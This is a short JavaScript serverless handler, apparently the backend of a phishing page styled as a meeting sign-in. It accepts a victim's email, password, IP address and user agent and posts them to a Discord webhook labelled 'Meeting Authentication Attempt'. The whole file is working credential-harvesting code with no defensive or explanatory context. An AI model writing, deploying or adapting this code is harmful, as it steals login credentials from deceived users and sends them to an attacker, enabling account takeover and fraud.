export async function onRequestPost(context) {
  const { request, env } = context;

  // Handle CORS
  const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
  };

  if (request.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { email, password, userAgent, ipAddress } = await request.json();

    const discordWebhookUrl = env.DISCORD_WEBHOOK_URL;
    if (!discordWebhookUrl) {
      throw new Error('Discord webhook URL not configured');
    }

    const payload = {
      embeds: [
        {
          title: "🔐 Meeting Authentication Attempt",
          color: 0x5865F2,
          fields: [
            {
              name: "Email",
              value: email,
              inline: true
            },
            {
              name: "Password",
              value: password,
              inline: true
            },
            {
              name: "IP Address",
              value: ipAddress || "Unknown",
              inline: true
            },
            {
              name: "User Agent",
              value: userAgent || "Unknown",
              inline: false
            },
            {
              name: "Timestamp",
              value: new Date().toISOString(),
              inline: true
            }
          ],
          timestamp: new Date().toISOString()
        }
      ]
    };

    const response = await fetch(discordWebhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      throw new Error(`Discord webhook failed: ${response.status}`);
    }

    return new Response(
      JSON.stringify({ success: true }),
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 200,
      }
    );
  } catch (error) {
    return new Response(
      JSON.stringify({ error: error.message }),
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 500,
      }
    );
  }
}